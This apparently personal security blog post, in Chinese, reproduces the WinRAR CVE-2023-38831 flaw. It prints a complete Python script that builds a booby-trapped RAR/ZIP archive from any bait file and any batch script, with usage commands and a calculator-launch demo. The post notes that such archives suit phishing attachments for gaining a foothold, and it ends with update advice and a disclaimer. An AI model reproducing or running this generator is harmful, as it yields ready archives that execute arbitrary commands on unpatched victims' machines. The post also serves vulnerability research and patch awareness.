WinRAR 的CVE-2023-38831 漏洞被在野利用来攻击交易类的个人用户。  
影响版本：WinRar 版本 < 6.23  
本人知识库也将同步此文章：[欢迎光临 adm8n的知识库](https://adm8n.github.io/)  
鸣谢参考文章：

  1. [Cybersecurity Services, Solutions & Products. Global Provider | Group-IB](https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/)

  2. [GitHub - BoredHackerBlog/winrar_CVE-2023-38831_lazy_poc](https://github.com/BoredHackerBlog/winrar_CVE-2023-38831_lazy_poc/tree/main)

## 漏洞工作原理

  1. WinRAR 0day漏洞允许攻击者创建恶意 .RAR 和 .ZIP 存档，这些存档显示看似无害的诱饵文件，例如 JPG (.jpg) 图像、文本文件 (.txt) 或 PDF (.pdf)，用户双击使用winRAR打开查看压缩文件，并在winRAR窗口中点击查看时触发漏洞 。

  2. 当用户打开该文档或者图像时，该漏洞将导致执行当前目录下的同名文件夹下的cmd或者bat脚本，可在设备上安装恶意软件，或者执行恶意指令，但是主机上的EDR安全卫士一般都会对恶意指令进行拦截操作。

  3. 本次已演示脚本启动计算器为例（start calc）。

## EXP构造存在漏洞压缩包。

  1. 在当前目录写入 cve-2023-38831-exp-gen.py

    
    
    import shutil
    import os, sys
    from os.path import join
    TEMPLATE_NAME = "TEMPLATE"
    OUTPUT_NAME = "CVE-2023-38831-poc.rar"
    
    BAIT_NAME = "CLASSIFIED_DOCUMENTS.pdf"
    SCRIPT_NAME = "script.bat"
    
    if len(sys.argv) > 3:
        BAIT_NAME = os.path.basename(sys.argv[1])
        SCRIPT_NAME = os.path.basename(sys.argv[2])
        OUTPUT_NAME = os.path.basename(sys.argv[3])
    elif len(sys.argv) == 2 and sys.argv[1] == "poc":
        pass
    else:
        print("""Usage:
              python .\cve-2023-38831-exp-gen.py poc
              python .\cve-2023-38831-exp-gen.py <BAIT_NAME> <SCRIPT_NAME> <OUTPUT_NAME>""")
        sys.exit()
    
    BAIT_EXT = b"." + bytes(BAIT_NAME.split(".")[-1], "utf-8")
    
    print("BAIT_NAME:", BAIT_NAME)
    print("SCRIPT_NAME:", SCRIPT_NAME)
    print("OUTPUT_NAME:", OUTPUT_NAME)
    
    if os.path.exists(TEMPLATE_NAME):
        shutil.rmtree(TEMPLATE_NAME)
    os.mkdir(TEMPLATE_NAME)
    d = join(TEMPLATE_NAME, BAIT_NAME + "A")
    if not os.path.exists(d):
        os.mkdir(d)
    
    shutil.copyfile(join(SCRIPT_NAME), join(d, BAIT_NAME+"A.cmd"))
    shutil.copyfile(join(BAIT_NAME), join(TEMPLATE_NAME, BAIT_NAME+"B"))
    
    # if os.path.exists(OUTPUT_NAME):
    #     print("!!! dir %s exists, delete it first" %(OUTPUT_NAME))
    #     sys.exit()
    
    shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME)
    
    with open(TEMPLATE_NAME + ".zip", "rb") as f:
        content = f.read()
        content = content.replace(BAIT_EXT + b"A", BAIT_EXT + b" ")
        content = content.replace(BAIT_EXT + b"B", BAIT_EXT + b" ")
    
    os.remove(TEMPLATE_NAME + ".zip")
    
    with open(OUTPUT_NAME, "wb")  as f:
        f.write(content)
    
    print("ok..")
    
    

  2. 现在当前文件夹中创建一个诱骗文件，PDF文档、txt文本文档、png图片都可，我这里使用xxx.pdf。

  3. 创建一个 script.bat 脚本文件，里面写入 “ start calc ”（不包括双引号） 。

![image](https://image.3001.net/images/20230828/1693229314_64eca1021c562ef0c277f.png!small)

  4. python执行EXP构造RAR压缩包，生成的poc.rar。

    
    
    python cve-2023-38831-exp-gen.py <bait name> <script name> <output name>
    
    执行 python cve-2023-38831-exp-gen.py xxx.pdf script.bat  poc.rar
    

![image](https://image.3001.net/images/20230828/1693229390_64eca14ee8c1195381d16.png!small)

## 验证漏洞

  
验证环境 ：win10

winRAR版本 v6.21 [下载地址](https://www.xitongzhijia.net/soft/20716.html)

![image](https://image.3001.net/images/20230828/1693229438_64eca17e94004afe94984.png!small)

开始使用，WinRAR打开查看压缩包，双击PDF文件。

![image](https://image.3001.net/images/20230828/1693229470_64eca19e31983eb7d7545.png!small)

漏洞利用成功。

![image](https://image.3001.net/images/20230828/1693229498_64eca1bab869d6636859a.png!small)  
此漏洞易出现在钓鱼邮件附件中，用户双击PDF可执行恶意代码，实现上线操作。

## 漏洞修复建议

立即更新最版本WinRAR压缩程序。

### 引用本文章，请联系作者授权谢谢，[欢迎光临 adm8n的知识库](https://adm8n.github.io/)

## 免责声明

免责声明：
本文旨在分享技术复现的相关知识和信息，仅供教育、研究和合法的安全测试之用。使用者应知悉并同意，任何通过本文所提供的技术和信息进行的活动，需遵守适用的法律法规，并获得相关授权。
特此声明，本文作者或发布者不对使用本文所提供的任何技术和信息导致的任何直接或间接损失、损害或法律纠纷承担责任。使用者应对其自身行为负完全责任，并自行承担相关风险。
使用者在使用本文所提供的技术和信息之前，请确保已获得合适的合法授权，并遵守以下准则：

合法使用原则：在任何情况下，禁止利用本文所涉及的技术和信息从事非法、未授权的活动，包括但不限于黑客攻击、非法入侵、未经授权的系统访问、数据篡改或窃取等。使用者应尊重他人的隐私权和知识产权，并严守法律和道德规范。  
授权原则：在进行任何测试、复原或演示攻击之前，确保已获得明确的合法授权。未经明确授权进行攻击或测试行为是违法的，一切后果由使用者自行承担。  
风险责任原则：使用者应意识到黑客技术复现存在风险，并且可能导致系统崩溃、数据丢失、业务中断或其他潜在的损害。在执行任何技术操作之前，请备份重要数据，并自行承担一切风险和责任。  
法律遵守原则：使用者应遵守适用的国家、地区或国际法律法规。在进行学习、实验和测试的过程中，绝不可涉及非法活动，包括但不限于窃取他人信息、破坏公共设施、恶意软件传播或侵犯知识产权等。  
请在使用本文所提供技术和信息之前，务必充分理解并接受上述责任和准则。
此免责声明适用于本文提供的任何技术和信息，无论以何种方式传播或使用，使用者一旦进行相关活动即视为接受以上所有规定和责任。

